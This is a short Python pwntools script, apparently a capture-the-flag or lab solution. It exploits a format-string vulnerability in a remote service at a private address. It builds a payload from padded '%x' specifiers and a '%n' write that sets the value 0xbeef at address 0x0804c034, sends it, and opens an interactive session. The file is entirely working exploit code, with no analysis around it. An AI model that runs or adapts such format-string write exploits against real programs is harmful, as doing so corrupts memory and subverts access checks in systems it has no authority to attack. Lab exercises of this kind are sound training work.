#!/usr/bin/env python3
from pwn import *

LOCAL = False

if LOCAL:
    local = './program'
    p = process(local)
else:
    url = '10.227.243.188'
    port = 4005
    p = remote(url, port)

p.recvuntil(b"...")

content = bytearray(0x00 for i in range(32))
password = 0xbeef

# the -24 is explained below
pad_str = "%0" + str(password - 24) + "x"
content[0:len(pad_str)] = (pad_str).encode('latin-1')

x_str = "%x"
x_len = len(x_str)
n = 3
for i in range(len(pad_str), len(pad_str) + x_len * n, x_len):
    content[i:i+x_len] = (x_str).encode('latin-1')

content[14:16] = ("%n").encode('latin-1')
val = 0x0804c034
content[16:20] = (val).to_bytes(4, byteorder='little')

with open('badfile', 'wb') as f:
  f.write(content)

p.sendline(content)
p.recvuntil(b"You gave")
p.interactive()
